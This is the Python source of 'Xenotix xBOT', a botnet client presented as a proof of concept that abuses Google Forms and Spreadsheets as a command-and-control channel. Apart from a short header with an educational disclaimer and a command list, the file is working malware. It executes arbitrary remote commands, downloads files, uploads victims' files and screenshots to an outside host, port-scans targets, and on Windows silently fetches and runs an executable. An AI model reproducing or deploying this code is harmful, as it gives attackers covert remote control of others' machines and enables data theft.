'''
STRICTLY FOR EDUCATIONAL AND RESEARCH PURPOSES ONLY
opensecurity.in

Xenotix  xBOT  is  a  proof of concept  cross  platform  (Linux,  Windows,  Mac)  bot  written  in  Python  that 
abuse  certain  Google  Services  to  implement  Command  &  Control  Center  for  the  botnet.  The 
Google Apps Data API, Google Forms and  Google Spreadsheet is abused to implement C2 for a 
bot network. The Google Forms can act as the C2 for a bot network. All the entries to the Google 
Form are send to an attached Spreadsheet.  Here we can implement a  bot that will listen to the 
Google Data API URL and extract the commands and later send back the response via the same 
Form. The Google Data API allows  us to fetch the contents  of a published spreadsheet in a variety 
of formats.  The  spreadsheet feeds  are fetched in RSS format  and will parsed.  For implementing 
the  bot  we  will  parse  through  the  source,  fetch  the  commands  and  do  the  corresponding 
operations.

xBOT's communication is encrypted as it uses Google's own SSL connection and is nowhere 
affected by any firewalls as it works at Application layer. The botnet's commands and 
responses are encrypted with SSL from Google Itself making it harder to sniff the bot’s 
communications in the network. It is a prototype bot with the bare minimum features of a Typical 
Bot. The intention of this tool is to give an idea about how Google API’s can be abused for 
Botnet Implementation.

=============
Xenotix xBOT
xBOT COMMANDS
============
xSYSINFO : Get System Information
xEXECUTE <command> : Execute a passive system command
xDOWNLOAD <url> : Download a file from an URL
xUPLOAD <filepath> : Upload a file
xNETWORK : Get network information
xPORTSCAN <ip> : Run a Portscan
xSCREENSHOT : Grab a Screenshot
xKILL : Kill and Remove the xBOT.
C&C:https://docs.google.com/forms/d/xxxxx/viewform
'''
import __main__,urllib,urllib2,httplib,base64,threading,random,platform,os,subprocess
from socket import *
from HTMLParser import HTMLParser
cmdrcv=''
feed="https://spreadsheets.google.com/feeds/list/xxxxxx/od6/public/basic?alt=rss"
actionurl="https://docs.google.com/forms/d/xxxxxx/formResponse"
cmdz='entry.xxxx' 
resp='entry.xxxx'
connected='entry.xxxx'
#Command Extraction
class MyParser(HTMLParser):
        commands = ""
        is_present = ""
        def handle_starttag(self, tag,attrs):
                if tag == 'description':
                        self.is_present = 1
        def handle_data(self, data):
                global cmdrcv
                if self.is_present:
                        if "command:" in data:
                                self.commands = data
                                cmdrcv=self.commands.replace("command: ","")
                self.is_title = 0

#Thread for checking new commmands.
class check_commands(threading.Thread):
    def __init__(self,botid):
        threading.Thread.__init__(self)
        self.event = threading.Event()
        self.botid=botid
    def run(self):
        global cmdrcv,connected,actionurl,cmdz,resp,feed
        try:
            while not self.event.is_set():
                file=urllib2.urlopen(feed)
                xml=file.read()
                file.close()
                parser = MyParser()
                parser.feed(xml)
                print cmdrcv
                #self.id -->botid
                if botid in cmdrcv or "xBOTALL" in cmdrcv:
                        print cmdrcv
                        if botid in cmdrcv:
                                cmdrcv=cmdrcv.replace(botid+' ','')
                        elif "xBOTALL" in cmdrcv:
                                cmdrcv=cmdrcv.replace("xBOTALL ","")
                        if cmdrcv=="xSYSINFO":
                                sys_info(cmdz,resp,botid)
                        elif "xDOWNLOAD" in cmdrcv:
                                url=cmdrcv.replace("xDOWNLOAD ","")
                                download(url,cmdz,resp,botid)
                        elif "xUPLOAD" in cmdrcv:
                                filepath=cmdrcv.replace("xUPLOAD ","")
                                upload(filepath,cmdz,resp,botid)
                        elif "xEXECUTE" in cmdrcv:
                                cmd=cmdrcv.replace("xEXECUTE ","")
                                execute(cmd,cmdz,resp,botid)
                        elif "xPORTSCAN" in cmdrcv:
                                host=cmdrcv.replace("xPORTSCAN ","")
                                portscan(host,cmdz,resp,botid)
                        elif cmdrcv=="xSCREENSHOT":
                                screenshot(cmdz,resp,botid)
                        elif cmdrcv=="xNETWORK":
                                network(cmdz,resp,botid)
                        elif cmdrcv=="xKILL":
                                selfkill(cmdz,resp,botid,actionurl,connected)
                        elif cmdrcv=="xDONE":
                            pass
                        else:
                            pass
        except:
            pass
        self.event.wait(4)
#send back responses to C&C.
def output(op_data,field):
    global actionurl
    response={field:op_data}
    try:
        dataenc=urllib.urlencode(response)
        req=urllib2.Request(actionurl,dataenc)
        urllib2.urlopen(req)
    except:
        pass
#system information module
def sys_info(cmdz,resp,botid):
    try:
        op=''
        if platform.system()=="Windows":
            for i in os.popen("systeminfo"):
                op=op+str(i)
        elif platform.system()=="Linux":
            for i in os.popen("cat /proc/version"):
                op=op+str(i)
            for i in os.popen("whoami"):
                op=op+"User: " +str(i)
            for i in os.popen("cat /proc/cpuinfo"):
                op=op+str(i)
        elif platform.system()=="Darwin":
            for i in os.popen("sw_vers"):
                op=op+str(i)
            for i in os.popen("system_profiler -detailLevel basic"):
                op=op+str(i)
        output(botid+': '+op,resp)
        output(botid+" xDONE",cmdz)
    except Exception as e:
        output(botid+': '+str(e),resp)
#download module
def download(url,cmdz,resp,botid):
    try:
        filename=url.split('/')
        filename=filename.pop()
        f=urllib2.urlopen(url)
        data=f.read()
        f.close()
        final=open(filename, "wb")
        final.write(data)
        final.close()
        output(botid+': '+filename + " downloaded sucessfully",resp)
        output(botid+" xDONE",cmdz)
    except Exception as e:
        output(botid+": Download failed with exception: "+str(e),resp) 			
#execute system commands
def execute(exe,cmdz,resp,botid):
    try:
        op=''
        for i in os.popen(exe):
            op=op+str(i)
        output(botid+": "+op,resp)
        output(botid+" xDONE",cmdz)
    except Exception as e:
        output(botid+": "+str(e),resp)
#file upload module
def upload(filepath,cmdz,resp,botid):
    try:
        fileupload(filepath,"/data/up.php")
        if platform.system()=="Windows":
            if "\\" in filepath:
                filename=filepath.split('\\')
                filename=filename.pop()
            else:
                filename=filepath
        elif platform.system()=="Darwin" or platform.system()=="Linux":
            if '/' in filepath:
                filename=filepath.split('/')
                filename=filename.pop()
            else:
                filename=filepath
        output(botid+": http://xboz.xxxxxcom/data/files/"+filename,resp)
        output(botid+" xDONE",cmdz)
    except Exception as e:
        output(botid+": "+str(e),resp)
#network module
def network(cmdz,resp,botid):
    try:
        op=''
        if platform.system()=="Windows":
            for i in os.popen("ipconfig"):
                op=op+str(i)
        elif platform.system()=="Darwin" or platform.system()=="Linux":
            for i in os.popen("ifconfig"):
                op=op+str(i)
        output(botid+": "+op,resp)
        output(botid+" xDONE",cmdz)
    except Exception as e:
        output(botid+': '+str(e),resp)
#portscanner module
def portscan(host,cmdz,resp,botid):
    try:
        op='Starting Port Scanner '
        targetIP = gethostbyname(host)
        for i in range(20, 5000):
            s = socket(AF_INET, SOCK_STREAM)
            result = s.connect_ex((targetIP, i))
            if(result == 0) :
                op=op+'PORT %d: OPEN\n' %(i,)
            s.close()
        output(botid+": "+op,resp)
        output(botid+" xDONE",cmdz)
    except Exception as e:
        output(botid+": "+str(e),resp)
#screenshot module
def screenshot(cmdz,resp,botid):
    try:
        if platform.system()=='Linux':
            os.system("gnome-screenshot -f screenshot.png")
        elif platform.system()=='Darwin':
            os.system("screencapture -x -t png /var/TMP/screenshot.png")
        elif platform.system()=='Windows':
            f=urllib2.urlopen("http://xboz.xxxx.com/data/screenshot.exe")
            data=f.read()
            f.close()
            final=open("screenshot.exe", "wb")
            final.write(data)
            final.close()
            info = subprocess.STARTUPINFO()
            info.dwFlags = 1
            info.wShowWindow = 0
            subprocess.Popen("screenshot.exe", startupinfo=info)
            os.remove("screenshot.exe")
        if platform.system()=='Darwin':
                fileupload("/var/TMP/screenshot.png","/screenshot/up.php")
                os.remove("/var/TMP/screenshot.png")
        else:
                fileupload("screenshot.png","/screenshot/up.php")
                os.remove('screenshot.png')
        output(botid+": http://xboz.xxxxx.com/screenshot/screenshot.png",resp)
        output(botid+" xDONE",cmdz)
    except Exception as e:
        output(botid +": "+str(e),resp)
#kill and terminate
def selfkill(cmdz,resp,botid,actionurl,field):
    try:
        x=str(__main__.__file__)
        os.remove(x)
        output(botid+" xBOT TERMINATED AND REMOVED!!",resp)
        output(botid+" xDONE",cmdz)
        response={field:botid+": DEAD"}
        dataenc=urllib.urlencode(response)
        req=urllib2.Request(actionurl,dataenc)
        urllib2.urlopen(req)
        exit(0)
    except Exception as e:
        output(botid+": "+str(e),resp)
#remote file upload
def fileupload(path,remote_dir):
    data = open(path, 'rb').read()
    encodedData = base64.encodestring( data )
    headers = { "Content-type": "application/x-www-form-urlencoded",
                "Accept": "text/plain",
                }
    params = urllib.urlencode({ u'fileName': os.path.split(path)[1],
                                u'data':encodedData})
    conn = httplib.HTTPConnection( "xboz.xxxxx.com")
    conn.request( "POST", remote_dir, params, headers )
    response = conn.getresponse( )
    conn.close( )
#unique bot registration
def bot_reg(actionurl,field):
        botid="unknown"
        if platform.system()=="Windows":
                botid="xBOTW"+str(random.randrange(1,500))
        elif platform.system()=="Linux":
                botid="xBOTL"+str(random.randrange(501,1000))
        elif platform.system()=="Darwin":
                botid="xBOTM"+str(random.randrange(1001,1500))
        response={field:botid}
        try:
                dataenc=urllib.urlencode(response)
                req=urllib2.Request(actionurl,dataenc)
                urllib2.urlopen(req)
        except:
            botid="nil"
            pass
        return botid
botid="nil"
while botid=="nil":
	botid=bot_reg(actionurl,connected)
	if "nil" not in botid:
		break
print "xBOT id:"+botid
xbot=check_commands(botid)
xbot.start()

